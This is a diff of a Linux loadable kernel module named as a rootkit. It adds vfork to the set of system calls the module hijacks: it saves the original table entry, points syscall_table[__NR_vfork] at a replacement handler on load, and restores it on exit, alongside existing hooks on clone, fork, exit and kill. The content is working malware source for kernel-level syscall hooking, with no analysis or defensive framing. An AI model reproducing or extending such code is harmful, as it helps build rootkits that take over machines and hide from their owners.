@@ -4,6 +4,7 @@ static unsigned long *syscall_table;
 
 asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
 sys_call_stub orig_fork;
+sys_call_stub orig_vfork;
 sys_call_stub orig_exit;
 sys_call_stub orig_exit_group;
 sys_call_stub orig_kill;
@@ -30,6 +31,7 @@ static int __init lkm_rootkit_init(void)
 
     orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
     orig_fork = (sys_call_stub)syscall_table[__NR_fork];
+    orig_vfork = (sys_call_stub)syscall_table[__NR_vfork];
     orig_exit = (sys_call_stub)syscall_table[__NR_exit];
     orig_exit_group = (sys_call_stub)syscall_table[__NR_exit_group];
     orig_kill = (sys_call_stub)syscall_table[__NR_kill];
@@ -39,6 +41,7 @@ static int __init lkm_rootkit_init(void)
 
     syscall_table[__NR_clone] = (unsigned long)rk_clone;
     syscall_table[__NR_fork] = (unsigned long)rk_fork;
+    syscall_table[__NR_vfork] = (unsigned long)rk_vfork;
     syscall_table[__NR_exit] = (unsigned long)rk_exit;
     syscall_table[__NR_exit_group] = (unsigned long)rk_exit_group;
     syscall_table[__NR_kill] = (unsigned long)rk_kill;
@@ -58,6 +61,7 @@ static void __exit lmk_rootkit_exit(void)
 
     syscall_table[__NR_clone] = (unsigned long)orig_clone;
     syscall_table[__NR_fork] = (unsigned long)orig_fork;
+    syscall_table[__NR_vfork] = (unsigned long)orig_vfork;
     syscall_table[__NR_exit] = (unsigned long)orig_exit;
     syscall_table[__NR_exit_group] = (unsigned long)orig_exit_group;
     syscall_table[__NR_kill] = (unsigned long)orig_kill;
